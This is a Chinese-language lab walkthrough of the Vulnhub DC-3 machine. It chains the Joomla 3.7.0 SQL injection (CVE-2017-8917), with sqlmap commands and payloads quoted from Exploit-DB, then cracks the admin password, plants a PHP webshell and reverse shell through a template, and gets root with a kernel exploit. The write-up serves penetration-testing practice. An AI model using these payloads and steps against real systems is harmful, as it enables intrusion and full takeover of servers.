Vulnhub-DC:3.2

信息收集

根据masscan的存活主机扫描确定了目标主机IP为192.168.12.95

根据nmap的信息收集，确定了目标开放了80端口，组件为Apache httpd 2.4.18，CMS为Joomla

敏感文件扫描：

使用joomscanjoomla漏洞扫描器得到Joomla版本为3.7.0

Joomla SQL

根据版本信息Google发现存在SQL注入漏洞，searchsploit中有payload(CVE-2017-8917)：

# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)

直接使用sqlmap梭哈，得到管理员密码

获取哈希值后使用john进行破解，得到密码snoopy，管理员帐号密码admin:snoopy

访问刚才敏感文件扫描得到的地址http://192.168.12.95/administrator/进行登录。

Get Shell

登录后，可以在添加模板处的页面添加一个php页面（位于Extensions–>Templates–>Templates–>Beez3），也就是说可以在这个页面写入一句话木马接入服务器

编辑完成后访问http://host/templates/beez3/shell.php

访问成功则一句话木马写入成功，可以使用蚁剑或其他webshell管理工具连接

提权

用webshell管理工具是无法提权成功的，因此我们需要一个反弹shell。

我们返回到上一步，在模板页面写入一个PHP反弹shell，并启用msf监听

PHP reverse shell:https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

信息收集一波发现服务器为Ubuntu 16.04 且内核版本为4.4.0-21

搜索相关漏洞，经过测试39772可以成功提权

将exp下载下来，然后通过蚁剑上传到目标服务器上

tar xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput

成功获得root权限
